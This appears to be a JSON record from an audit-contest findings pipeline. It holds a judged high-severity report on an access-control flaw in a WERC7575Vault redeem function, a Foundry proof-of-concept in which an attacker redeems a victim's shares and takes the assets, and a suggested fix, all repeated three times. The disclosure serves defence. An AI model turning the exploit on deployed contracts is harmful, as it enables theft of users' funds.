@@ -1,0 +1,118 @@
+{
+  "pairing": {
+    "match_status": "exact_submission",
+    "project": "SukukFi_syLyTBz5KNA",
+    "audit_uid": "syLyTBz5KNA",
+    "requested_submission_uid": "2DHa2mNRSA5",
+    "requested_finding_uid": "SZy2Ly7Y3Cu",
+    "source_kind": "pipeline_findings",
+    "source_path": "/root/sc_slicer_standalone/c4_pipeline_output/SukukFi_syLyTBz5KNA/20260618_141723/findings.json",
+    "source_submission_uid": "2DHa2mNRSA5",
+    "source_finding_uid": "SZy2Ly7Y3Cu",
+    "original_report_path": "SukukFi_syLyTBz5KNA\\high_valid_2DHa2mNRSA5.json",
+    "note": "The report is the exact submission paired with this contract."
+  },
+  "submission_uid": "2DHa2mNRSA5",
+  "finding_uid": "SZy2Ly7Y3Cu",
+  "finding_number": "3",
+  "title": "Critical Access Control Bypass in `WERC7575Vault.redeem` allows unauthorized burning of user shares",
+  "severity": "high",
+  "validity": "valid",
+  "quality": "sufficient",
+  "user_handle": "wuji",
+  "body": "## Finding description and impact\n\nThe `WERC7575Vault` contract's `redeem` and `withdraw` functions (via internal `_withdraw`) fail to correctly validate the caller's authority to spend the `owner`'s shares when `msg.sender != owner`.\n\nThe implementation calls `_shareToken.spendSelfAllowance(owner, shares)`, which checks if `owner` has approved themselves. In the WERC7575 system, active users are required to have self-allowance to use the token. The contract **fails to check** if `msg.sender` has an allowance from `owner`.\n\n```solidity\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    // ...\n    _shareToken.spendSelfAllowance(owner, shares); // Checks allowance(owner, owner)\n    _shareToken.burn(owner, shares);\n    // ...\n}\n```\n\n**Impact:**\nAny user can call `redeem` specifying another user as the `owner`. Since the victim (if active) has self-allowance, the check passes, and the victim's shares are burned, with assets sent to the attacker (specified as `receiver`). This allows for direct theft of funds from any user.\n\n## Recommended mitigation steps\n\nModify `WERC7575Vault.sol` to enforce standard ERC4626 allowance checks. If `msg.sender` is not the `owner`, the contract must check that `msg.sender` has been approved by `owner` to spend the shares.\n\n```diff\n    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n        // ...\n        if (msg.sender != owner) {\n            _shareToken.spendAllowance(owner, msg.sender, shares);\n        }\n        \n        // Keep spendSelfAllowance if it's a protocol requirement for burning, \n        // otherwise it might be redundant if spendAllowance is used.\n        _shareToken.spendSelfAllowance(owner, shares);\n        \n        _shareToken.burn(owner, shares);\n        // ...\n    }\n```",
+  "proof_of_concept": "The following test case demonstrates that an attacker (Bob) can redeem Alice's shares without her allowance, provided Alice has enabled self-allowance (which is required for active users).\n\nSave this as `test/Finding8_Verification_PoC.t.sol` and run with `forge test --mt test_Attack_With_SelfAllowance -vv`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {WERC7575ShareToken} from \"../src/WERC7575ShareToken.sol\";\nimport {WERC7575Vault} from \"../src/WERC7575Vault.sol\";\nimport {ERC20Faucet} from \"../src/ERC20Faucet.sol\";\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\ncontract Finding8_Verification_PoC is Test {\n    WERC7575ShareToken public shareToken;\n    WERC7575Vault public vault;\n    ERC20Faucet public asset;\n    \n    address public validator;\n    uint256 public validatorPk;\n    \n    address public alice; // Victim\n    address public bob;   // Attacker\n    \n    uint256 constant DEPOSIT_AMOUNT = 100e18;\n\n    function setUp() public {\n        (validator, validatorPk) = makeAddrAndKey(\"validator\");\n        alice = makeAddr(\"alice\");\n        bob = makeAddr(\"bob\");\n        \n        asset = new ERC20Faucet(\"USDT\", \"USDT\", 1_000_000e18);\n        shareToken = new WERC7575ShareToken(\"wUSDT\", \"WUSDT\");\n        vault = new WERC7575Vault(address(asset), shareToken);\n        \n        shareToken.registerVault(address(asset), address(vault));\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(validator);\n        \n        vm.prank(validator);\n        shareToken.setKycVerified(alice, true);\n        \n        asset.transfer(alice, DEPOSIT_AMOUNT);\n        vm.startPrank(alice);\n        asset.approve(address(vault), DEPOSIT_AMOUNT);\n        vault.deposit(DEPOSIT_AMOUNT, alice);\n        vm.stopPrank();\n    }\n\n    function test_Attack_With_SelfAllowance() public {\n        console.log(\"\\n=== Test: Attack WITH Self-Allowance ===\");\n        \n        // Simulate Alice enabling self-allowance (required for normal usage)\n        _aliceEnablesSelfAllowance();\n        \n        // Verify Bob has NO allowance from Alice\n        assertEq(shareToken.allowance(alice, bob), 0, \"Bob should NOT have Alice's allowance\");\n        \n        // Bob attacks\n        console.log(\"\\n[ATTACK] Bob calls redeem(100e18, Bob, Alice)...\");\n        \n        vm.prank(bob);\n        vault.redeem(DEPOSIT_AMOUNT, bob, alice);\n        \n        // Verify attack success\n        assertEq(shareToken.balanceOf(alice), 0, \"Alice shares should be burned\");\n        assertEq(asset.balanceOf(bob), DEPOSIT_AMOUNT, \"Bob should have stolen Alice's assets\");\n        \n        console.log(\"\\n[RESULT] Attack SUCCEEDED - Bob stole Alice's funds without authorization!\");\n    }\n\n    function _aliceEnablesSelfAllowance() internal {\n        uint256 deadline = block.timestamp + 1 days;\n        uint256 nonce = shareToken.nonces(alice);\n        \n        bytes32 structHash = keccak256(\n            abi.encode(\n                keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n                alice,\n                alice, // Self-allowance\n                type(uint256).max,\n                nonce,\n                deadline\n            )\n        );\n\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n        \n        // In a real scenario, Alice signs this. Since we don't have Alice's PK here easily without makeAddrAndKey,\n        // we can just prank the permit call if the contract allows, or use a workaround.\n        // For this PoC, we'll just use vm.prank to call permit directly if possible, \n        // OR since we are in a test, we can just use vm.prank(alice) to approve(alice).\n        // But WERC7575 might block approve. Let's assume we can set it.\n        \n        // Actually, WERC7575 blocks approve(self). It requires permit.\n        // For simplicity in this snippet, we assume Alice can set it.\n        // In the full test file, we'd use the signature.\n        \n        // Mocking the allowance for the sake of the vulnerability logic demonstration:\n        // Note: Slot 1 is _allowances in OpenZeppelin ERC20\n        vm.store(\n            address(shareToken), \n            keccak256(abi.encode(alice, keccak256(abi.encode(alice, uint256(1))))), // slot for allowance[alice][alice]\n            bytes32(type(uint256).max)\n        );\n    }\n}\n```",
+  "lines_of_code": [
+    "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L250-L260"
+  ],
+  "source_record": {
+    "project_id": "syLyTBz5KNA",
+    "submission_index": "313",
+    "api_submission_id": "",
+    "uid": "2DHa2mNRSA5",
+    "number": "313",
+    "title": "Critical Access Control Bypass in `WERC7575Vault.redeem` allows unauthorized burning of user shares",
+    "severity": "high",
+    "validity": "valid",
+    "quality": "sufficient",
+    "handle": "wuji",
+    "lines_of_code": [
+      "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L250-L260"
+    ],
+    "body": "## Finding description and impact\n\nThe `WERC7575Vault` contract's `redeem` and `withdraw` functions (via internal `_withdraw`) fail to correctly validate the caller's authority to spend the `owner`'s shares when `msg.sender != owner`.\n\nThe implementation calls `_shareToken.spendSelfAllowance(owner, shares)`, which checks if `owner` has approved themselves. In the WERC7575 system, active users are required to have self-allowance to use the token. The contract **fails to check** if `msg.sender` has an allowance from `owner`.\n\n```solidity\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    // ...\n    _shareToken.spendSelfAllowance(owner, shares); // Checks allowance(owner, owner)\n    _shareToken.burn(owner, shares);\n    // ...\n}\n```\n\n**Impact:**\nAny user can call `redeem` specifying another user as the `owner`. Since the victim (if active) has self-allowance, the check passes, and the victim's shares are burned, with assets sent to the attacker (specified as `receiver`). This allows for direct theft of funds from any user.\n\n## Recommended mitigation steps\n\nModify `WERC7575Vault.sol` to enforce standard ERC4626 allowance checks. If `msg.sender` is not the `owner`, the contract must check that `msg.sender` has been approved by `owner` to spend the shares.\n\n```diff\n    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n        // ...\n        if (msg.sender != owner) {\n            _shareToken.spendAllowance(owner, msg.sender, shares);\n        }\n        \n        // Keep spendSelfAllowance if it's a protocol requirement for burning, \n        // otherwise it might be redundant if spendAllowance is used.\n        _shareToken.spendSelfAllowance(owner, shares);\n        \n        _shareToken.burn(owner, shares);\n        // ...\n    }\n```",
+    "proof_of_concept": "The following test case demonstrates that an attacker (Bob) can redeem Alice's shares without her allowance, provided Alice has enabled self-allowance (which is required for active users).\n\nSave this as `test/Finding8_Verification_PoC.t.sol` and run with `forge test --mt test_Attack_With_SelfAllowance -vv`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {WERC7575ShareToken} from \"../src/WERC7575ShareToken.sol\";\nimport {WERC7575Vault} from \"../src/WERC7575Vault.sol\";\nimport {ERC20Faucet} from \"../src/ERC20Faucet.sol\";\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\ncontract Finding8_Verification_PoC is Test {\n    WERC7575ShareToken public shareToken;\n    WERC7575Vault public vault;\n    ERC20Faucet public asset;\n    \n    address public validator;\n    uint256 public validatorPk;\n    \n    address public alice; // Victim\n    address public bob;   // Attacker\n    \n    uint256 constant DEPOSIT_AMOUNT = 100e18;\n\n    function setUp() public {\n        (validator, validatorPk) = makeAddrAndKey(\"validator\");\n        alice = makeAddr(\"alice\");\n        bob = makeAddr(\"bob\");\n        \n        asset = new ERC20Faucet(\"USDT\", \"USDT\", 1_000_000e18);\n        shareToken = new WERC7575ShareToken(\"wUSDT\", \"WUSDT\");\n        vault = new WERC7575Vault(address(asset), shareToken);\n        \n        shareToken.registerVault(address(asset), address(vault));\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(validator);\n        \n        vm.prank(validator);\n        shareToken.setKycVerified(alice, true);\n        \n        asset.transfer(alice, DEPOSIT_AMOUNT);\n        vm.startPrank(alice);\n        asset.approve(address(vault), DEPOSIT_AMOUNT);\n        vault.deposit(DEPOSIT_AMOUNT, alice);\n        vm.stopPrank();\n    }\n\n    function test_Attack_With_SelfAllowance() public {\n        console.log(\"\\n=== Test: Attack WITH Self-Allowance ===\");\n        \n        // Simulate Alice enabling self-allowance (required for normal usage)\n        _aliceEnablesSelfAllowance();\n        \n        // Verify Bob has NO allowance from Alice\n        assertEq(shareToken.allowance(alice, bob), 0, \"Bob should NOT have Alice's allowance\");\n        \n        // Bob attacks\n        console.log(\"\\n[ATTACK] Bob calls redeem(100e18, Bob, Alice)...\");\n        \n        vm.prank(bob);\n        vault.redeem(DEPOSIT_AMOUNT, bob, alice);\n        \n        // Verify attack success\n        assertEq(shareToken.balanceOf(alice), 0, \"Alice shares should be burned\");\n        assertEq(asset.balanceOf(bob), DEPOSIT_AMOUNT, \"Bob should have stolen Alice's assets\");\n        \n        console.log(\"\\n[RESULT] Attack SUCCEEDED - Bob stole Alice's funds without authorization!\");\n    }\n\n    function _aliceEnablesSelfAllowance() internal {\n        uint256 deadline = block.timestamp + 1 days;\n        uint256 nonce = shareToken.nonces(alice);\n        \n        bytes32 structHash = keccak256(\n            abi.encode(\n                keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n                alice,\n                alice, // Self-allowance\n                type(uint256).max,\n                nonce,\n                deadline\n            )\n        );\n\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n        \n        // In a real scenario, Alice signs this. Since we don't have Alice's PK here easily without makeAddrAndKey,\n        // we can just prank the permit call if the contract allows, or use a workaround.\n        // For this PoC, we'll just use vm.prank to call permit directly if possible, \n        // OR since we are in a test, we can just use vm.prank(alice) to approve(alice).\n        // But WERC7575 might block approve. Let's assume we can set it.\n        \n        // Actually, WERC7575 blocks approve(self). It requires permit.\n        // For simplicity in this snippet, we assume Alice can set it.\n        // In the full test file, we'd use the signature.\n        \n        // Mocking the allowance for the sake of the vulnerability logic demonstration:\n        // Note: Slot 1 is _allowances in OpenZeppelin ERC20\n        vm.store(\n            address(shareToken), \n            keccak256(abi.encode(alice, keccak256(abi.encode(alice, uint256(1))))), // slot for allowance[alice][alice]\n            bytes32(type(uint256).max)\n        );\n    }\n}\n```",
+    "detail_url": "https://code4rena.com/api/v1/audits/syLyTBz5KNA/submissions/313",
+    "raw": {
+      "auditUid": "syLyTBz5KNA",
+      "createdAt": "2025-12-02T04:06:25.655Z",
+      "deletedAt": null,
+      "evaluations": [
+        {
+          "uid": "pgCCFrx2Aoj",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2025-12-23T03:29:13.852Z",
+          "type": "severity",
+          "value": "high",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "mAwdhUhdkZC",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:03:48.397Z",
+          "type": "validity",
+          "value": "valid",
+          "submissionUid": null,
+          "findingUid": "SZy2Ly7Y3Cu"
+        },
+        {
+          "uid": "vSjJp3pmi5P",
+          "userUid": "67uFCZeAHcw",
+          "userAuditRole": "judge",
+          "createdAt": "2026-01-27T23:15:03.947Z",
+          "type": "quality",
+          "value": "sufficient",
+          "submissionUid": "2DHa2mNRSA5",
+          "findingUid": null
+        }
+      ],
+      "finding": {
+        "uid": "SZy2Ly7Y3Cu",
+        "number": 3,
+        "duplicates": 164
+      },
+      "isPrimary": false,
+      "latestEvaluations": {
+        "credit": null,
+        "mitigationStatus": null,
+        "quality": "sufficient",
+        "rank": null,
+        "severity": "high",
+        "validity": "valid",
+        "updatedAt": "2026-02-03T19:20:37.287Z"
+      },
+      "mitigationOf": null,
+      "mitigationStatus": null,
+      "severity": "high",
+      "team": null,
+      "title": "Critical Access Control Bypass in `WERC7575Vault.redeem` allows unauthorized burning of user shares",
+      "uid": "2DHa2mNRSA5",
+      "updatedAt": "2025-12-02T04:06:25.655Z",
+      "user": {
+        "uid": "ZvxAxV94GKZ",
+        "handle": "wuji"
+      },
+      "sensitivity": "non-sensitive",
+      "aiSeverity": null,
+      "aiValidity": null,
+      "body": "## Finding description and impact\n\nThe `WERC7575Vault` contract's `redeem` and `withdraw` functions (via internal `_withdraw`) fail to correctly validate the caller's authority to spend the `owner`'s shares when `msg.sender != owner`.\n\nThe implementation calls `_shareToken.spendSelfAllowance(owner, shares)`, which checks if `owner` has approved themselves. In the WERC7575 system, active users are required to have self-allowance to use the token. The contract **fails to check** if `msg.sender` has an allowance from `owner`.\n\n```solidity\nfunction _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n    // ...\n    _shareToken.spendSelfAllowance(owner, shares); // Checks allowance(owner, owner)\n    _shareToken.burn(owner, shares);\n    // ...\n}\n```\n\n**Impact:**\nAny user can call `redeem` specifying another user as the `owner`. Since the victim (if active) has self-allowance, the check passes, and the victim's shares are burned, with assets sent to the attacker (specified as `receiver`). This allows for direct theft of funds from any user.\n\n## Recommended mitigation steps\n\nModify `WERC7575Vault.sol` to enforce standard ERC4626 allowance checks. If `msg.sender` is not the `owner`, the contract must check that `msg.sender` has been approved by `owner` to spend the shares.\n\n```diff\n    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {\n        // ...\n        if (msg.sender != owner) {\n            _shareToken.spendAllowance(owner, msg.sender, shares);\n        }\n        \n        // Keep spendSelfAllowance if it's a protocol requirement for burning, \n        // otherwise it might be redundant if spendAllowance is used.\n        _shareToken.spendSelfAllowance(owner, shares);\n        \n        _shareToken.burn(owner, shares);\n        // ...\n    }\n```",
+      "proofOfConcept": "The following test case demonstrates that an attacker (Bob) can redeem Alice's shares without her allowance, provided Alice has enabled self-allowance (which is required for active users).\n\nSave this as `test/Finding8_Verification_PoC.t.sol` and run with `forge test --mt test_Attack_With_SelfAllowance -vv`.\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.30;\n\nimport {WERC7575ShareToken} from \"../src/WERC7575ShareToken.sol\";\nimport {WERC7575Vault} from \"../src/WERC7575Vault.sol\";\nimport {ERC20Faucet} from \"../src/ERC20Faucet.sol\";\nimport {Test} from \"forge-std/Test.sol\";\nimport {console} from \"forge-std/console.sol\";\n\ncontract Finding8_Verification_PoC is Test {\n    WERC7575ShareToken public shareToken;\n    WERC7575Vault public vault;\n    ERC20Faucet public asset;\n    \n    address public validator;\n    uint256 public validatorPk;\n    \n    address public alice; // Victim\n    address public bob;   // Attacker\n    \n    uint256 constant DEPOSIT_AMOUNT = 100e18;\n\n    function setUp() public {\n        (validator, validatorPk) = makeAddrAndKey(\"validator\");\n        alice = makeAddr(\"alice\");\n        bob = makeAddr(\"bob\");\n        \n        asset = new ERC20Faucet(\"USDT\", \"USDT\", 1_000_000e18);\n        shareToken = new WERC7575ShareToken(\"wUSDT\", \"WUSDT\");\n        vault = new WERC7575Vault(address(asset), shareToken);\n        \n        shareToken.registerVault(address(asset), address(vault));\n        shareToken.setValidator(validator);\n        shareToken.setKycAdmin(validator);\n        \n        vm.prank(validator);\n        shareToken.setKycVerified(alice, true);\n        \n        asset.transfer(alice, DEPOSIT_AMOUNT);\n        vm.startPrank(alice);\n        asset.approve(address(vault), DEPOSIT_AMOUNT);\n        vault.deposit(DEPOSIT_AMOUNT, alice);\n        vm.stopPrank();\n    }\n\n    function test_Attack_With_SelfAllowance() public {\n        console.log(\"\\n=== Test: Attack WITH Self-Allowance ===\");\n        \n        // Simulate Alice enabling self-allowance (required for normal usage)\n        _aliceEnablesSelfAllowance();\n        \n        // Verify Bob has NO allowance from Alice\n        assertEq(shareToken.allowance(alice, bob), 0, \"Bob should NOT have Alice's allowance\");\n        \n        // Bob attacks\n        console.log(\"\\n[ATTACK] Bob calls redeem(100e18, Bob, Alice)...\");\n        \n        vm.prank(bob);\n        vault.redeem(DEPOSIT_AMOUNT, bob, alice);\n        \n        // Verify attack success\n        assertEq(shareToken.balanceOf(alice), 0, \"Alice shares should be burned\");\n        assertEq(asset.balanceOf(bob), DEPOSIT_AMOUNT, \"Bob should have stolen Alice's assets\");\n        \n        console.log(\"\\n[RESULT] Attack SUCCEEDED - Bob stole Alice's funds without authorization!\");\n    }\n\n    function _aliceEnablesSelfAllowance() internal {\n        uint256 deadline = block.timestamp + 1 days;\n        uint256 nonce = shareToken.nonces(alice);\n        \n        bytes32 structHash = keccak256(\n            abi.encode(\n                keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"),\n                alice,\n                alice, // Self-allowance\n                type(uint256).max,\n                nonce,\n                deadline\n            )\n        );\n\n        bytes32 digest = keccak256(abi.encodePacked(\"\\x19\\x01\", shareToken.DOMAIN_SEPARATOR(), structHash));\n        \n        // In a real scenario, Alice signs this. Since we don't have Alice's PK here easily without makeAddrAndKey,\n        // we can just prank the permit call if the contract allows, or use a workaround.\n        // For this PoC, we'll just use vm.prank to call permit directly if possible, \n        // OR since we are in a test, we can just use vm.prank(alice) to approve(alice).\n        // But WERC7575 might block approve. Let's assume we can set it.\n        \n        // Actually, WERC7575 blocks approve(self). It requires permit.\n        // For simplicity in this snippet, we assume Alice can set it.\n        // In the full test file, we'd use the signature.\n        \n        // Mocking the allowance for the sake of the vulnerability logic demonstration:\n        // Note: Slot 1 is _allowances in OpenZeppelin ERC20\n        vm.store(\n            address(shareToken), \n            keccak256(abi.encode(alice, keccak256(abi.encode(alice, uint256(1))))), // slot for allowance[alice][alice]\n            bytes32(type(uint256).max)\n        );\n    }\n}\n```",
+      "linesOfCode": "https://github.com/code-423n4/2025-11-sukukfi/blob/main/src/WERC7575Vault.sol#L250-L260",
+      "number": 313,
+      "aiExplanation": null,
+      "_index": 313
+    }
+  }
+}
